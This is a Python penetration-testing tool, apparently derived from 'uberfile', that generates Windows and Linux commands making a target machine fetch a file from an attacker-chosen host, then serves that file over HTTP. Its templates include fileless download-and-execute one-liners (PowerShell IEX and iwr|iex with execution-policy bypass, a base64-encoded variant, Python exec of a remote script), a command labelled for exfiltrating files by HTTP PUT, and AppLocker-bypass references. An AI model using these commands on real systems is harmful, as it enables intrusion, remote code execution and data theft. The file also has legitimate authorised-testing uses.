#!/usr/bin/env python3
# Author: Bigyls
# Based on https://github.com/ShutdownRepo/uberfile (Shutdown)

import argparse
import sys
import os
import psutil
import socket
import subprocess

from colorama import Fore
from colorama import Style
from base64 import b64encode
from pyperclip import copy
from simple_term_menu import TerminalMenu

here = os.getcwd()

# files = {"windows": {
#     "nc.exe": "/opt/resources/windows/nc.exe",
#     "winPEASx64.exe": "/opt/resources/windows/winPEAS/winPEASx64.exe",
# }, "linux": {
#     "linpeas.sh": "/opt/resources/linux/linPEAS/linpeas.sh",
#     "SUIDump.py": "/opt/my-resources/linux/SUIDump.py",
# }}

def menu(title, menu_list):
    menu = TerminalMenu(menu_list, title=title)
    selection = menu.show()
    return menu_list[selection]

def menu_with_custom_choice(title, menu_list):
    menu_list.append('Custom')
    selection = menu(title, menu_list)
    if selection == 'Custom':
        print(f'(custom) {title}')
        selection = input(Fore.RED + Style.BRIGHT + '> ' + Style.RESET_ALL)
        return selection
    else:
        return selection.split('(')[1].split(')')[0]

def select_address():
    interfaces = {}
    net_if_addrs = psutil.net_if_addrs()
    for iface, addr in net_if_addrs.items():
        if iface == 'lo':
            continue
        for address in addr:
            if address.family == socket.AF_INET:
                interfaces.update({iface:address.address})

    menu_list = []
    for key in interfaces:
        menu_list.append(key + ' (' + interfaces[key] + ')')

    return menu_with_custom_choice("Interface/address serving the files?", menu_list)

def list_commands():
    print(Fore.BLUE + Style.BRIGHT + 'Windows commands' + Style.RESET_ALL)
    for command in sorted(windows.keys()):
        print('   - ' + command)
    print()
    print(Fore.BLUE + Style.BRIGHT + 'Linux commands' + Style.RESET_ALL)
    for command in sorted(linux.keys()):
        print('   - ' + command)
    quit()

def get_options():
    parser = argparse.ArgumentParser(description='Generate a file downloader/uploader command', formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-lp', '--lport', dest='LPORT', type=str, help='Server port')
    parser.add_argument('-lh', '--lhost', dest='LHOST', type=str, help='Server address')
    parser.add_argument('-t', '--target-os', dest='TARGETOS', type=str, choices={"windows","linux"}, help='Target machine operating system')
    parser.add_argument('-d', '--command', dest='TYPE', type=str, help='command')
    parser.add_argument('-D', '--input-folder', default=here, dest='INPUTFOLDER', type=str, help='Folder where file is located')
    parser.add_argument('-f', '--input-file', dest='INPUTFILE', type=str, help='File to be downloaded in local folder (or full path)')
    parser.add_argument('-o', '--output-file', dest='OUTPUTFILE', type=str, help='File to write on the target machine')
    parser.add_argument('-l', '--list', dest='LIST', action='store_true', help='Print all the commands UberFiles can generate')
    options = parser.parse_args()
    if options.LIST:
        list_commands()
    if not options.TARGETOS:
        options.TARGETOS = menu("What operating system is the target running?", ['windows','linux'])
    if not options.TYPE:
        commands_dict = globals()[options.TARGETOS]
        menu_list = sorted(list(commands_dict.keys()))
        options.TYPE = menu("What type of command do you want?", menu_list)
    if not options.LHOST:
        options.LHOST = select_address()
    if not options.LPORT:
        menu_list = [
            'HTTP (80)',
            'HTTPS (443)',
        ]
        options.LPORT = menu_with_custom_choice("Port serving the files?", menu_list)
    if not options.INPUTFILE:
        menu_list = ["fzf resources", "fzf my-resources", "fzf all"]
        # if options.TARGETOS == "windows":
        #     menu_list += [f for f in files[options.TARGETOS]]
        # if options.TARGETOS == "linux":
        #     menu_list += [f for f in files[options.TARGETOS]]
        menu_list += [ f for f in os.listdir(here) if os.path.isfile(os.path.join(here, f))]
        options.INPUTFILE = menu('Which file do you want the target to download?', menu_list)
    if options.INPUTFILE == "fzf resources":
        fzf_result = subprocess.run("find /opt/resources | fzf", shell=True, stdout=subprocess.PIPE, text=True)
        options.INPUTFOLDER = os.path.dirname(fzf_result.stdout.strip())
        options.INPUTFILE = os.path.basename(fzf_result.stdout.strip())
    if options.INPUTFILE == "fzf my-resources":
        fzf_result = subprocess.run("find /opt/my-resources | fzf", shell=True, stdout=subprocess.PIPE, text=True)
        options.INPUTFOLDER = os.path.dirname(fzf_result.stdout.strip())
        options.INPUTFILE = os.path.basename(fzf_result.stdout.strip())
    if options.INPUTFILE == "fzf all":
        fzf_result = subprocess.run("fzf", shell=True, stdout=subprocess.PIPE, text=True)
        options.INPUTFOLDER = os.path.dirname(fzf_result.stdout.strip())
        options.INPUTFILE = os.path.basename(fzf_result.stdout.strip())
    if not options.OUTPUTFILE:
        menu_list = ['Same filename ({})'.format(options.INPUTFILE)]
        if options.TARGETOS == "windows":
            menu_list.append('Same filename in temp ({})'.format('C:\Windows\Temp\\' + options.INPUTFILE))
            # TODO: add legit names
            #menu_list.append('Some legit name ({})'.format('licence.txt'))
        if options.TARGETOS == "linux":
            menu_list.append('Same filename in /tmp ({})'.format('/tmp/' + options.INPUTFILE))
        options.OUTPUTFILE = menu_with_custom_choice("Filename to write on the target machine?", menu_list)
    return options

# Helper function for populate_commands() to add values to the dictionnaries
def add_command(commands_dict, type, command, notes=None):
    if not type in commands_dict.keys():
        commands = []
    else:
        commands = commands_dict[type]
    commands.append((notes, command))
    commands_dict.update({type:commands})

# Add commands to the main dictionnaries: windows and linux
def populate_commands():
    ## TODO: populate this
    add_command(linux, 'curl', '''curl http://{LHOST}:{LPORT}/{INPUTFILE} -o {OUTPUTFILE}''')
    add_command(linux, 'wget', '''wget {LHOST}:{LPORT}/{INPUTFILE} -O {OUTPUTFILE}''')
    add_command(commands_dict=linux, type='python', notes="In memory", command='''python -c "import urllib2; exec urllib2.urlopen('{LHOST}:{LPORT}/{INPUTFILE}').read()"''')
    add_command(windows, 'certutil', '''certutil.exe -urlcache -f http://{LHOST}:{LPORT}/{INPUTFILE} {OUTPUTFILE}''')
    add_command(windows, 'powershell', '''powershell.exe -c "(New-Object Net.WebClient).DownloadFile('http://{LHOST}:{LPORT}/{INPUTFILE}','{OUTPUTFILE}')"''')
    add_command(windows, 'powershell', '''powershell.exe -c "Invoke-WebRequest 'http://{LHOST}:{LPORT}/{INPUTFILE}' -OutFile '{OUTPUTFILE}' ''')
    add_command(windows, 'powershell', '''powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source 'http://{LHOST}:{LPORT}/{INPUTFILE}' -Destination '{OUTPUTFILE}'"''')
    add_command(windows, 'powershell', '''powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source 'http://{LHOST}:{LPORT}/{INPUTFILE}' -Destination '{OUTPUTFILE}' -Asynchronous"''')
    add_command(commands_dict=windows, type='powershell', notes="In memory", command='''powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://{LHOST}:{LPORT}/{INPUTFILE}')"''')
    add_command(commands_dict=windows, type='powershell', notes="In memory", command='''powershell.exe -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://{LHOST}:{LPORT}/{INPUTFILE}')|iex"''')
    add_command(windows, 'bitsadmin', '''bitsadmin.exe /transfer 5720 /download /priority normal http://{LHOST}:{LPORT}/{INPUTFILE} {OUTPUTFILE}''')
    add_command(windows, 'wget', '''wget "http://{LHOST}:{LPORT}/{INPUTFILE}" -OutFile "{OUTPUTFILE}"''')
    add_command(commands_dict=windows, type='powershell', notes="Exfiltrate file with HTTP PUT", command='''powershell -c "Invoke-WebRequest -uri http://{LHOST}:{LPORT}/{OUTPUTFILE} -Method Put -Infile {INPUTFILE}"''')
    add_command(commands_dict=windows, type='regsvr32', notes="AppLocker bypass", command='''https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/''')

# Add commands to the main dictionnaries: windows and linux
# this function is called after getting the options allowing commands to be generated with the values right now
# this allows for the generation of more complex commands (i.e. base64 encoded) but
# bear in mind the command type must already exist in populate_commands() for it to be listed when calling get_options()
def populate_post_options_commands():
    add_command(commands_dict=windows, type='powershell', notes="In memory (base64)", command='''powershell.exe -nop -enc "{}"'''.format(b64encode("IEX(New-Object Net.WebClient).downloadString('http://{LHOST}:{LPORT}/{INPUTFILE}')".replace('{LHOST}', options.LHOST).replace('{LPORT}',options.LPORT).replace('{INPUTFILE}',options.INPUTFILE).replace('{OUTPUTFILE}',options.OUTPUTFILE).encode('UTF-16LE')).decode('utf-8')))
    add_command(commands_dict=windows, type='powershell', notes="Execution policy bypass", command='''https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters#execution-policy''')

def run_server(LHOST, LPORT, INPUTFILE):
    # if INPUTFILE in files[options.TARGETOS]:
    #     INPUTFILE  = files[options.TARGETOS][INPUTFILE]
    if not os.path.isabs(INPUTFILE):
        INPUTFILE = os.path.dirname(os.path.abspath(INPUTFILE))
    if os.path.exists(INPUTFILE):
        os.system(f"python3 -m http.server -b {LHOST} -d {options.INPUTFOLDER} {LPORT}")
        return True
    else:
        print(Fore.RED + Style.BRIGHT + "Input file not found" + Style.RESET_ALL)
        return False

if __name__ == '__main__':
    windows = {}
    linux = {}
    populate_commands()
    options = get_options()
    populate_post_options_commands()
    commands_dict = globals()[options.TARGETOS]
    print()
    for notes, command in commands_dict[options.TYPE]:
        command_index = commands_dict[options.TYPE].index((notes, command)) + 1
        print_command = command.replace('{LHOST}', options.LHOST).replace('{LPORT}',options.LPORT).replace('{INPUTFILE}',options.INPUTFILE).replace('{OUTPUTFILE}',options.OUTPUTFILE).strip()
        print_notes = ''
        if notes is not None:
            print_notes = notes + ' '
        print(Fore.BLUE + Style.BRIGHT + '[' + str(command_index) + '] ' + print_notes + Style.RESET_ALL + print_command + '\n')
    cmdline = f'{sys.argv[0]} --lhost {options.LHOST} --lport {options.LPORT} --target-os {options.TARGETOS} --command {options.TYPE} --input-file {options.INPUTFILE} --output-file {options.OUTPUTFILE}'
    print(Fore.RED + Style.BRIGHT + 'CLI command used\n' + Style.RESET_ALL + cmdline + '\n')
    copy(commands_dict[options.TYPE][0][1].replace('{LHOST}', options.LHOST).replace('{LPORT}',options.LPORT).replace('{INPUTFILE}',options.INPUTFILE).replace('{OUTPUTFILE}',options.OUTPUTFILE).strip())
    if run_server(options.LHOST, options.LPORT, options.INPUTFILE):
        pass
    else:
        print(Fore.RED + Style.BRIGHT + "Server failed" + Style.RESET_ALL)
